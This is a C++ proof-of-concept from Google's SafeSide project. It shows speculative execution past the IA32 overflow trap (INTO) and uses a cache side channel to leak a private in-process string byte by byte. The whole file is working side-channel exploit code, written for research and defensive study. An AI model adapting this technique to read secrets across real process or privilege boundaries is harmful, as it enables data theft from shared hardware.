/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

/**
 * Demonstrates speculation over the overflow trap (#OF) on IA32 CPUs.
 * Since the overflow trap can be invoked only by the INTO instruction and that
 * instruction opcode exists only on IA32, this vulnerability cannot be
 * demonstrated on X64 or AMD64.
 * We cause the overflow trap by making the OF flag in EFLAGS being set.
 * Afterwards we yield the INTO instruction and fetch from the address. Even
 * though the INTO instruction triggers OF, the next load is speculatively
 * performed.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX && !SAFESIDE_MAC
#  error Unsupported OS. Linux or MacOS required.
#endif

#if !SAFESIDE_IA32
#  error Unsupported architecture. IA32 required.
#endif

#include <signal.h>

#include <array>
#include <climits>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "faults.h"
#include "local_content.h"
#include "utils.h"

// Different platforms raise different signals in response to the OF trap.
#if SAFESIDE_LINUX
constexpr int kOverflowSignal = SIGSEGV;
#elif SAFESIDE_MAC
constexpr int kOverflowSignal = SIGFPE;
#endif

static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(data);
    sidechannel.FlushOracle();

    for (int i = 0; i < 1000; ++i) {
      const char *safe_address = reinterpret_cast<const char *>(oracle.data() +
          static_cast<uint8_t>(data[safe_offset]));

      // Succeeds.
      SupposedlySafeOffsetAndDereference(safe_address, 0);

      const char *unsafe_address = reinterpret_cast<const char *>(
          oracle.data() + static_cast<uint8_t>(data[offset]));

      bool firstbit = reinterpret_cast<ptrdiff_t>(unsafe_address) & 0x80000000;
      int shift = INT_MAX - 2 * firstbit * INT_MAX;

      bool handled_fault = RunWithFaultHandler(kOverflowSignal, [&]() {
        // Delay retirement of OF trap.
        ExtendSpeculationWindow();

        // This crashes by the OF trap being raised.
        SupposedlySafeOffsetAndDereference(unsafe_address + shift, -shift);
      });

      if (!handled_fault) {
        std::cerr << "Read didn't yield expected fault" << std::endl;
        exit(EXIT_FAILURE);
      }
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
